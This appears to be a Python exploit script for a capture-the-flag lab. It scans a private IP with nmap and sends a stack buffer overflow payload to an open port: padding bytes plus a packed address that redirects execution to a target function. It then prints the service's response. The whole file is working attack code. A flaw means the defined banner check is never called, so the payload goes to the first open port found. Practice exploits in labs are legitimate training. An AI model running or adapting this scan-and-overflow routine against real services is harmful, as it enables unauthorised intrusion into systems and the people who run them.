import subprocess
import socket
from struct import pack
import time

ctf_ip = "192.168.64.6"  # Replace with actual target IP
offset = 40              # Updated based on the vuln_remote server structure
hacked_addr = 0x0000000000400c6c  # Replace with actual runtime address

def get_open_ports():
    print("[*] Running nmap scan...")
    try:
        result = subprocess.run(
            ["nmap", "-p", "1025-65535", "--open", ctf_ip, "-T4", "-Pn"],
            capture_output=True, text=True, check=True
        )
        ports = []
        for line in result.stdout.splitlines():
            if "/tcp" in line and "open" in line:
                port = int(line.split("/")[0])
                ports.append(port)
        print(f"[+] Found open ports: {ports}")
        return ports
    except subprocess.CalledProcessError as e:
        print("[-] Nmap scan failed:", e)
        return []

def test_banner(port):
    try:
        with socket.create_connection((ctf_ip, port), timeout=5) as s:
            banner = s.recv(64)
            print(f"Banner rcvd:")
            print(banner.decode(errors="ignore"))
            return b"Mini-CTF" in banner
    except:
        return False

def send_payload(port):
    payload = b"A" * offset + pack("<Q", hacked_addr)
    try:
        with socket.create_connection((ctf_ip, port), timeout=5) as s:
            banner = s.recv(1024)  # Read prompt/banner
            print(f"Banner rcvd:")
            print(banner.decode(errors="ignore"))
            time.sleep(0.2)
            print(f"[+] Sending payload to port {port}...")
            s.sendall(payload)
            time.sleep(0.5)
            while True:
                try:
                    data = s.recv(1024)
                    if not data:
                        break
                    print(data.decode(errors="ignore"), end='')
                except Exception as e:
                    break
    except Exception as e:
        print(f"[-] Exploit failed on port {port}: {e}")

def main():
    open_ports = get_open_ports()
    for port in open_ports:
            print(f"[+] Found Mini-CTF on port {port}")
            send_payload(port)
            return
    print("[-] Could not find target service.")

if __name__ == "__main__":
    main()
